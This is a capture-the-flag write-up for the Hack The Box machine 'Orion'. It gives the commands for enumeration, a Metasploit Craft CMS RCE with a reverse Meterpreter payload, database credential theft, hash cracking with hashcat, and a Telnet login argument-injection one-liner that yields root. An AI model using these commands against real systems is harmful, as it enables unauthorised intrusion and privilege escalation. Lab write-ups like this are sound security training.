Hack The Box

Orion

Level: Easy

Summary of the attack path:

  • Craft CMS 5.6.16 — CVE-2025-32432.
  • Cracking hashed credentials obtained from the database with hashcat.
  • Vulnerable running service — Telnet 2.7, CVE-2026-24061.

1. Enumeration

We start with port enumeration.

sudo nmap -p- --open -sS --min-rate 5000 -Pn -n -vvv 10.129.64.239

We find ports 22 and 80 open.

Using ffuf, we find the admin directory:

ffuf -w ~/Downloads/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://orion.htb/FUZZ

The site runs Craft CMS 5.6.16.

2. Foothold

Reference PoC: CVE-2025-32432-PoC

Opening Metasploit, we find a module that gives us RCE.

msfconsole -q msf > search Craftcms msf > use exploit/linux/http/craftcms_preauth_rce_cve_2025_32432 msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > options ...

Make sure you have set the proper payload:

msf exploit(linux/http/craftcms_preauth_rce_cve_2025_32432) > set payload php/meterpreter/reverse_http

We get a Meterpreter session.

meterpreter >

In /etc/passwd we find two users:

  • root
  • adam

By reading the environment at /var/www/html/craft/.env, we find a password:

SuperSecureCraft123Pass!

These credentials log us in to the database.

Back then when I solved it, I connected by the easy way:

meterpreter > shell python3 -c 'import pty; pty.spawn("/bin/bash")'
mysql -u root -p Enter password: SuperSecureCraft123Pass!
MariaDB [(none)]> show databases; MariaDB [(none)]> use orion; MariaDB [orion]> select * from users;

But when I tried to solve it again, I could not get an interactive shell besides the Meterpreter. So I had to use a different way.

meterpreter > execute -H -f /usr/bin/mysql -a "-h 127.0.0.1 -P 3306 -u root -pSuperSecureCraft123Pass! orion -e 'SHOW TABLES;'" -c Process 1828 created. Channel 6 created. meterpreter > channel -r 6 Read 860 bytes from 6: Tables_in_orion addresses announcements ... users ... meterpreter > execute -H -f /usr/bin/mysql -a "-h 127.0.0.1 -P 3306 -u root -pSuperSecureCraft123Pass! orion -e 'SELECT id, username, email, password FROM users;'" -c Process 1832 created. Channel 7 created. meterpreter > channel -r 7 Read 111 bytes from 7: id username email password 1 admin adam@orion.htb $2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS

Here we find a hash for the user adam, with the email adam@orion.htb:

$2y$13$e9zuohgFZzGtbQalcn9Mz.5PJbjxobO0GMbXo8NHp3P/B42LUg0lS

We crack it with hashcat:

hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt
Credentials adam : darkangel

3. Privilege Escalation

Root

After logging in as adam, we check the running services with this command:

ss -tulpn

We see a service running on port 23, which is normally used for Telnet.

telnet -V telnet (GNU inetutils) 2.7

This version is vulnerable to a local privilege escalation, CVE-2026-24061.

Running the script gives us root privileges.

Root Flag [REDACTED]

An easier way is to use this command:

USER="-f root" telnet -a 127.0.0.1 23
  • USER="-f root": The server takes the user-supplied USER environment variable and passes it, without checking it, into the system's /usr/bin/login command line. It then runs login -f root. The -f flag tells the system to skip the password check and log the user in right away.
  • -a, --login: Attempt automatic login.

So we tell the system to use the root user, skip the password check, and attempt automatic login.
